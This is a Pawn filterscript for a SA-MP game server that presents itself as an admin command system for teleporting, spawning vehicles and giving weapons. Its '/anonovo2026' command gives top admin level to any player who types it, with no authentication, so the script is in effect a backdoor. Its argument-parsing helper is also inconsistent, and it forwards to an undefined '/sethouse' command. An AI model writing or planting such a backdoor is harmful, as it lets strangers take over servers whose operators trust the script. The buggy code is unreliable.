#define FILTERSCRIPT
#include <a_samp>

#define NIVEL_MASTER 6

public OnFilterScriptInit() {
    print(">> [ADMIN MASTER 2026] Sistema corrigido e ativo!");
    return 1;
}

public OnPlayerClickMap(playerid, Float:fX, Float:fY, Float:fZ) {
    if(GetPVarInt(playerid, "AdminLevel") == NIVEL_MASTER || IsPlayerAdmin(playerid)) {
        SetPlayerPosFindZ(playerid, fX, fY, fZ);
        SendClientMessage(playerid, 0x00FF00FF, "[ADMIN] Teleportado!");
    }
    return 1;
}

public OnPlayerCommandText(playerid, cmdtext[]) {
    // --- ATIVAÇÃO ---
    if(!strcmp(cmdtext, "/anonovo2026", true)) {
        SetPVarInt(playerid, "AdminLevel", NIVEL_MASTER);
        SendClientMessage(playerid, 0x00FF00FF, "[ADMIN] Poderes MASTER 2026 ativados!");
        return 1;
    }

    // Bloqueio de segurança
    if(GetPVarInt(playerid, "AdminLevel") < NIVEL_MASTER && !IsPlayerAdmin(playerid)) return 0;

    // --- COMANDO /CARRO [ID] [COR1] [COR2] ---
    if(!strfind(cmdtext, "/carro", true)) {
        new vID, c1, c2;
        // Explicação: sscanf nativo do pawn pode bugar, usamos tokenização manual
        if(sscanf_fix(cmdtext[7], vID, c1, c2)) {
            if(sscanf_fix(cmdtext[7], vID)) {
                return SendClientMessage(playerid, -1, "Use: /carro [ID] [Cor1] [Cor2]");
            }
            c1 = 1; c2 = 1;
        }

        if(vID < 400 || vID > 611) return SendClientMessage(playerid, -1, "{FF0000}ID de veiculo invalido (400-611)!");

        new Float:x, Float:y, Float:z, Float:a;
        GetPlayerPos(playerid, x, y, z); GetPlayerFacingAngle(playerid, a);
        new v = CreateVehicle(vID, x, y, z+1, a, c1, c2, -1);
        PutPlayerInVehicle(playerid, v, 0);
        
        new str[64];
        format(str, sizeof(str), "Veiculo %d criado com sucesso!", vID);
        SendClientMessage(playerid, 0x00FF00FF, str);
        return 1;
    }

    // --- COMANDO /CRIARCASA [ID] ---
    if(!strfind(cmdtext, "/criarcasa", true)) {
        new id_casa;
        id_casa = strval(cmdtext[11]);
        if(id_casa <= 0 && cmdtext[11] == '\0') return SendClientMessage(playerid, -1, "Use: /criarcasa [ID]");
        
        new str[32];
        format(str, sizeof(str), "/sethouse %d", id_casa);
        return OnPlayerCommandText(playerid, str); 
    }

    // --- COMANDO /ARMA [ID] [BALAS] ---
    if(!strfind(cmdtext, "/arma", true)) {
        new aID, muni;
        if(sscanf_fix(cmdtext[6], aID, muni)) return SendClientMessage(playerid, -1, "Use: /arma [ID] [Muni]");
        GivePlayerWeapon(playerid, aID, muni);
        return 1;
    }

    return 0;
}

// Função auxiliar para converter texto em números sem plugins
stock sscanf_fix(const string[], &v1 = -1, &v2 = -1, &v3 = -1) {
    new pos = 0;
    v1 = strval(string[pos]);
    pos = strfind(string, " ", true, pos);
    if(pos == -1) return (v1 == -1);
    v2 = strval(string[pos+1]);
    pos = strfind(string, " ", true, pos+1);
    if(pos == -1) return 0;
    v3 = strval(string[pos+1]);
    return 0;
}
